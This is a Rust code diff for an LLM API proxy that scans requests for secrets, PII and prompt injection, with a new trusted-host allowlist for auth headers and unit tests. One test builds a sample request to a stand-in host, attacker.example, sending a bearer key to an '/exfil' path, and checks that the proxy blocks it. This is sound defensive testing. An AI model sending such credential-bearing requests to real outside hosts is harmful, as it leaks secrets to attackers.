@@ -121,6 +121,10 @@ pub struct ProxyConfig {
     pub block_secrets_in_responses: bool,
     pub block_pii_in_prompts: bool,
     pub block_pii_in_responses: bool,
+    /// Allow credentials in auth headers when destination host is trusted.
+    pub allow_auth_secrets_to_trusted_hosts: bool,
+    /// Trusted hostnames for legitimate credential-based authentication.
+    pub trusted_auth_hosts: Vec<String>,
     pub slack_webhook: Option<String>,
 }
 
@@ -133,6 +137,14 @@ impl Default for ProxyConfig {
             block_secrets_in_responses: true,
             block_pii_in_prompts: false,
             block_pii_in_responses: false,
+            allow_auth_secrets_to_trusted_hosts: true,
+            trusted_auth_hosts: vec![
+                "api.openai.com".to_string(),
+                "api.anthropic.com".to_string(),
+                "generativelanguage.googleapis.com".to_string(),
+                "api.mistral.ai".to_string(),
+                "api.cohere.ai".to_string(),
+            ],
             slack_webhook: None,
         }
     }
@@ -331,12 +343,8 @@ async fn handle_http_request(
     handlers: ProxyHandlers,
     config: ProxyConfig,
 ) -> Result<()> {
-    // Extract body for scanning
-    let body_start = request.find("\r\n\r\n").map(|i| i + 4);
-    let body = body_start.map(|i| &request[i..]).unwrap_or("");
-
-    // Scan request body
-    let scan_result = scan_content(body, &handlers, &config, "request").await;
+    // Scan the full request in context-aware mode.
+    let scan_result = scan_http_request(request, target, &handlers, &config).await;
 
     if scan_result.should_block && config.level == ProtectionLevel::Block {
         // Block the request
@@ -387,85 +395,250 @@ struct ScanResult {
     alerts: Vec<String>,
 }
 
-/// Scan content for security issues
-async fn scan_content(
-    content: &str,
+const AUTH_HEADERS: &[&str] = &[
+    "authorization",
+    "proxy-authorization",
+    "x-api-key",
+    "api-key",
+    "x-auth-token",
+    "x-access-token",
+];
+
+fn normalize_host(host: &str) -> String {
+    let trimmed = host.trim().trim_matches('[').trim_matches(']').to_lowercase();
+    if let Some((name, _port)) = trimmed.rsplit_once(':') {
+        // If it looks like host:port, strip the port.
+        if !name.contains(':') {
+            return name.to_string();
+        }
+    }
+    trimmed
+}
+
+fn host_is_trusted(host: &str, trusted_hosts: &[String]) -> bool {
+    let normalized = normalize_host(host);
+    trusted_hosts.iter().any(|entry| {
+        let entry = normalize_host(entry);
+        normalized == entry || normalized.ends_with(&format!(".{}", entry))
+    })
+}
+
+fn extract_request_host(request: &str, target: &str) -> Option<String> {
+    if target.starts_with("http://") || target.starts_with("https://") {
+        let no_scheme = target
+            .trim_start_matches("http://")
+            .trim_start_matches("https://");
+        let host = no_scheme.split('/').next().unwrap_or_default();
+        if !host.is_empty() {
+            return Some(normalize_host(host));
+        }
+    }
+
+    request.lines().find_map(|line| {
+        let mut parts = line.splitn(2, ':');
+        let name = parts.next()?.trim().to_lowercase();
+        let value = parts.next()?.trim();
+        if name == "host" {
+            Some(normalize_host(value))
+        } else {
+            None
+        }
+    })
+}
+
+fn split_request_parts(request: &str) -> (String, String, String, String) {
+    let mut sections = request.splitn(2, "\r\n\r\n");
+    let header_block = sections.next().unwrap_or_default();
+    let body = sections.next().unwrap_or_default().to_string();
+
+    let mut lines = header_block.lines();
+    let request_line = lines.next().unwrap_or_default().to_string();
+    let request_target = request_line
+        .split_whitespace()
+        .nth(1)
+        .unwrap_or_default()
+        .to_string();
+
+    let mut auth_headers = String::new();
+    let mut non_auth_headers = String::new();
+
+    for line in lines {
+        let mut parts = line.splitn(2, ':');
+        let Some(name_raw) = parts.next() else {
+            continue;
+        };
+        let Some(value_raw) = parts.next() else {
+            continue;
+        };
+
+        let name = name_raw.trim().to_lowercase();
+        let value = value_raw.trim();
+
+        if AUTH_HEADERS.contains(&name.as_str()) {
+            auth_headers.push_str(value);
+            auth_headers.push('\n');
+        } else {
+            non_auth_headers.push_str(&name);
+            non_auth_headers.push(':');
+            non_auth_headers.push_str(value);
+            non_auth_headers.push('\n');
+        }
+    }
+
+    (request_target, auth_headers, non_auth_headers, body)
+}
+
+fn add_alert(alerts: &mut Vec<String>, message: String) {
+    if !alerts.iter().any(|a| a == &message) {
+        alerts.push(message);
+    }
+}
+
+fn set_blocked(should_block: &mut bool, reason: &mut String, block_reason: String) {
+    *should_block = true;
+    if reason.is_empty() {
+        *reason = block_reason;
+    }
+}
+
+/// Scan full HTTP request for security issues with auth-aware policy.
+async fn scan_http_request(
+    request: &str,
+    target: &str,
     handlers: &ProxyHandlers,
     config: &ProxyConfig,
-    direction: &str,
 ) -> ScanResult {
     let mut should_block = false;
     let mut reason = String::new();
     let mut alerts = Vec::new();
 
-    // Check for secrets
-    let secrets_result = handlers.secrets_detector.scan(content, "proxy");
-    if secrets_result.secrets_found {
-        let secret_types: Vec<_> = secrets_result.secrets.iter().map(|s| s.secret_type.as_str()).collect();
-        alerts.push(format!("Secrets detected in {}: {:?}", direction, secret_types));
+    let host = extract_request_host(request, target);
+    let trusted_host = host
+        .as_ref()
+        .map(|h| host_is_trusted(h, &config.trusted_auth_hosts))
+        .unwrap_or(false);
 
-        let block_secrets = if direction == "request" {
-            config.block_secrets_in_prompts
+    let (request_target, auth_headers, non_auth_headers, body) = split_request_parts(request);
+    let request_text_for_prompt = format!("{}\n{}", request_target, body);
+
+    // 1) Auth headers: allow for trusted destinations.
+    let auth_secrets = handlers
+        .secrets_detector
+        .scan(&auth_headers, "proxy_request_auth_headers");
+    if auth_secrets.secrets_found {
+        let secret_types: Vec<_> = auth_secrets
+            .secrets
+            .iter()
+            .map(|s| s.secret_type.as_str())
+            .collect();
+
+        if config.allow_auth_secrets_to_trusted_hosts && trusted_host {
+            add_alert(
+                &mut alerts,
+                format!(
+                    "Auth credentials detected in headers for trusted host {} (allowed)",
+                    host.clone().unwrap_or_else(|| "unknown".to_string())
+                ),
+            );
         } else {
-            config.block_secrets_in_responses
-        };
+            add_alert(
+                &mut alerts,
+                format!(
+                    "Credentials detected in auth headers to untrusted host {:?}: {:?}",
+                    host, secret_types
+                ),
+            );
 
-        if block_secrets {
-            should_block = true;
-            reason = format!("Credentials detected: {:?}", secret_types);
+            if config.block_secrets_in_prompts {
+                set_blocked(
+                    &mut should_block,
+                    &mut reason,
+                    "Credentials in auth headers to untrusted destination".to_string(),
+                );
+            }
         }
 
-        // Record metric
         let metrics = handlers.metrics.write().await;
-        for secret in &secrets_result.secrets {
+        for secret in &auth_secrets.secrets {
             metrics.record_secret(&secret.secret_type, &secret.severity);
         }
     }
 
-    // Check for PII
-    let pii_result = handlers.pii_detector.scan(content, "proxy");
-    if pii_result.pii_found {
-        let pii_types: Vec<_> = pii_result
-            .pii_types
-            .iter()
-            .map(|p| p.pii_type.as_str())
-            .collect();
-        alerts.push(format!("PII detected in {}: {:?}", direction, pii_types));
+    // 2) Non-auth request parts (headers, target/query, body): treat as potential leakage.
+    for (segment, location_label) in [
+        (&non_auth_headers, "request headers"),
+        (&request_target, "request target"),
+        (&body, "request body"),
+    ] {
+        let secrets_result = handlers.secrets_detector.scan(segment, "proxy_request");
+        if secrets_result.secrets_found {
+            let secret_types: Vec<_> = secrets_result
+                .secrets
+                .iter()
+                .map(|s| s.secret_type.as_str())
+                .collect();
+            add_alert(
+                &mut alerts,
+                format!("Secrets detected in {}: {:?}", location_label, secret_types),
+            );
 
-        let block_pii = if direction == "request" {
-            config.block_pii_in_prompts
-        } else {
-            config.block_pii_in_responses
-        };
+            if config.block_secrets_in_prompts {
+                set_blocked(
+                    &mut should_block,
+                    &mut reason,
+                    format!("Credentials detected in {}", location_label),
+                );
+            }
 
-        // Only block high-risk PII
-        let has_high_risk = pii_result
-            .pii_types
-            .iter()
-            .any(|p| p.severity == "critical" || p.severity == "high");
-        if block_pii && has_high_risk {
-            should_block = true;
-            reason = format!("High-risk PII detected: {:?}", pii_types);
+            let metrics = handlers.metrics.write().await;
+            for secret in &secrets_result.secrets {
+                metrics.record_secret(&secret.secret_type, &secret.severity);
+            }
         }
 
-        // Record metric
-        let metrics = handlers.metrics.write().await;
-        for p in &pii_result.pii_types {
-            metrics.record_pii(&p.pii_type, p.count as u64);
+        let pii_result = handlers.pii_detector.scan(segment, "proxy_request");
+        if pii_result.pii_found {
+            let pii_types: Vec<_> = pii_result
+                .pii_types
+                .iter()
+                .map(|p| p.pii_type.as_str())
+                .collect();
+            add_alert(
+                &mut alerts,
+                format!("PII detected in {}: {:?}", location_label, pii_types),
+            );
+
+            let has_high_risk = pii_result
+                .pii_types
+                .iter()
+                .any(|p| p.severity == "critical" || p.severity == "high");
+            if config.block_pii_in_prompts && has_high_risk {
+                set_blocked(
+                    &mut should_block,
+                    &mut reason,
+                    format!("High-risk PII detected in {}", location_label),
+                );
+            }
+
+            let metrics = handlers.metrics.write().await;
+            for p in &pii_result.pii_types {
+                metrics.record_pii(&p.pii_type, p.count as u64);
+            }
         }
     }
 
-    // Check for prompt injection (requests only)
-    if direction == "request" {
-        let security = handlers.prompt_security.analyze(content);
-        if security.injection_detected {
-            alerts.push("Prompt injection attempt detected".to_string());
-            should_block = true;
-            reason = "Prompt injection detected".to_string();
+    // 3) Prompt injection checks over request target + body.
+    let security = handlers.prompt_security.analyze(&request_text_for_prompt);
+    if security.injection_detected {
+        add_alert(&mut alerts, "Prompt injection attempt detected".to_string());
+        set_blocked(
+            &mut should_block,
+            &mut reason,
+            "Prompt injection detected".to_string(),
+        );
 
-            let metrics = handlers.metrics.write().await;
-            metrics.record_injection("prompt_injection");
-        }
+        let metrics = handlers.metrics.write().await;
+        metrics.record_injection("prompt_injection");
     }
 
     ScanResult {
@@ -479,4 +652,113 @@ async fn scan_content(
 pub async fn start_proxy(config: ProxyConfig) -> Result<()> {
     let proxy = DhiProxy::new(config);
     proxy.start().await
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn test_handlers() -> ProxyHandlers {
+        ProxyHandlers {
+            secrets_detector: Arc::new(SecretsDetector::new()),
+            pii_detector: Arc::new(PiiDetector::new()),
+            prompt_security: Arc::new(PromptSecurityAnalyzer::new()),
+            _alerter: Arc::new(Alerter::new(AlertConfig::default())),
+            metrics: Arc::new(RwLock::new(DhiMetrics::new())),
+        }
+    }
+
+    fn sample_openai_project_key() -> &'static str {
+        "sk-proj-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    }
+
+    #[tokio::test]
+    async fn test_allows_auth_header_secret_for_trusted_host() {
+        let handlers = test_handlers();
+        let config = ProxyConfig::default();
+        let request = format!(
+            "POST /v1/chat/completions HTTP/1.1\r\nHost: api.openai.com\r\nAuthorization: Bearer {}\r\nContent-Type: application/json\r\n\r\n{{\"model\":\"gpt-4o\",\"messages\":[{{\"role\":\"user\",\"content\":\"hello\"}}]}}",
+            sample_openai_project_key()
+        );
+
+        let result = scan_http_request(
+            &request,
+            "/v1/chat/completions",
+            &handlers,
+            &config,
+        )
+        .await;
+
+        assert!(!result.should_block, "Trusted auth flow should not be blocked");
+        assert!(
+            result.alerts.iter().any(|a| a.contains("trusted host")),
+            "Expected informational alert about trusted host auth allowance"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_blocks_auth_header_secret_for_untrusted_host() {
+        let handlers = test_handlers();
+        let config = ProxyConfig {
+            level: ProtectionLevel::Block,
+            ..ProxyConfig::default()
+        };
+        let request = format!(
+            "POST /exfil HTTP/1.1\r\nHost: attacker.example\r\nAuthorization: Bearer {}\r\nContent-Type: application/json\r\n\r\n{{\"q\":\"exfiltrate\"}}",
+            sample_openai_project_key()
+        );
+
+        let result = scan_http_request(&request, "/exfil", &handlers, &config).await;
+
+        assert!(result.should_block, "Untrusted auth credential usage must be blocked");
+        assert!(
+            result.reason.contains("auth headers") || result.reason.contains("untrusted"),
+            "Unexpected reason: {}",
+            result.reason
+        );
+    }
+
+    #[tokio::test]
+    async fn test_blocks_secret_in_request_body_even_for_trusted_host() {
+        let handlers = test_handlers();
+        let config = ProxyConfig {
+            level: ProtectionLevel::Block,
+            ..ProxyConfig::default()
+        };
+        let request = "POST /v1/chat/completions HTTP/1.1\r\nHost: api.openai.com\r\nContent-Type: application/json\r\n\r\n{\"user_note\":\"api_key=abcdefghijklmnopqrstuvwxyz1234567890\"}";
+
+        let result = scan_http_request(request, "/v1/chat/completions", &handlers, &config).await;
+
+        assert!(result.should_block, "Secrets in body should be treated as leakage");
+        assert!(
+            result.reason.contains("request body") || result.reason.contains("Credentials"),
+            "Unexpected reason: {}",
+            result.reason
+        );
+    }
+
+    #[tokio::test]
+    async fn test_blocks_secret_in_request_target_query() {
+        let handlers = test_handlers();
+        let config = ProxyConfig {
+            level: ProtectionLevel::Block,
+            ..ProxyConfig::default()
+        };
+        let request = "GET /v1/chat/completions?api_key=abcdefghijklmnopqrstuvwxyz1234567890 HTTP/1.1\r\nHost: api.openai.com\r\n\r\n";
+
+        let result = scan_http_request(
+            request,
+            "/v1/chat/completions?api_key=abcdefghijklmnopqrstuvwxyz1234567890",
+            &handlers,
+            &config,
+        )
+        .await;
+
+        assert!(result.should_block, "Secrets in URL/query should be blocked");
+        assert!(
+            result.reason.contains("request target") || result.reason.contains("Credentials"),
+            "Unexpected reason: {}",
+            result.reason
+        );
+    }
 }
